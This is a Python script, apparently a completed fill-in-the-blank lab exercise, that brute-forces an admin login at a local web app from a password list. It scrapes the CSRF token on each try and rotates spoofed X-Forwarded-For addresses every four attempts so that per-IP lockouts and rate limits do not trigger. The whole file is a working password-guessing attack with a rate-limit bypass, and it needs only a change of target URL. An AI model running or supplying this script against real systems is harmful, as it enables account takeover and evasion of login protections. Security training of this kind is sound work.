#!/usr/bin/python3
import string, requests

# DO NOT CHANGE SECTION STARTS
# -----------------------------------------------------------

loginDetails = {
    "username": "admin",
    "password": "SecretPwd!" # Palceholder for password. Change to expected needs.
}

header={
    "X-Forwarded-For": "10.10.10.10" #Placeholder for client IP address
}

# Login URL
loginUrl = "http://localhost:30000/"

# Get the CSRF token. Important if the website uses CSRF tokens
session = requests.Session()
res = session.get(loginUrl)
loginDetails["csrfmiddlewaretoken"] = res.text.split("csrfmiddlewaretoken\" value=\"")[-1].split("\"")[0]

# Get all passwords from the password list
data = list()
with open("/home/labDirectory/passwords.lst", "rt") as f:
    for line in f.readlines():
        data.append(line.strip())

def printFinalOutput(password):
    print(f"\t[+] Found a valid username:password pair--> admin:{password}")

# -----------------------------------------------------------
# DO NOT CHANGE SECTION ENDS


# Brute force the password
i=0
j=0
l=0
while(l<len(data)):
    ################ Write bruteforce logic here by filling the blanks###############
    ############ specified as __(FIB)__ #############################################
    #################################################################################
    header["X-Forwarded-For"] = "10.14." + str(i) + "." + str(j)
    j+=1
    if(j==256):
        i+=1
        j=0
    for k in range(1,5):
        loginDetails["password"] = data[l]
        print(f"[*] Bruteforce attempt #{l+1}, Trying password: " + data[l])
        response = session.post(loginUrl, data=loginDetails, headers=header)
        if response.status_code == 200 and "Incorrect Username or Password." not in response.text:
            printFinalOutput(data[l]) # Send the password for final output
            exit(0)
        l+=1
        loginDetails["csrfmiddlewaretoken"] = response.text.split("csrfmiddlewaretoken\" value=\"")[-1].split("\"")[0]
print("[-] No Password found for admin user")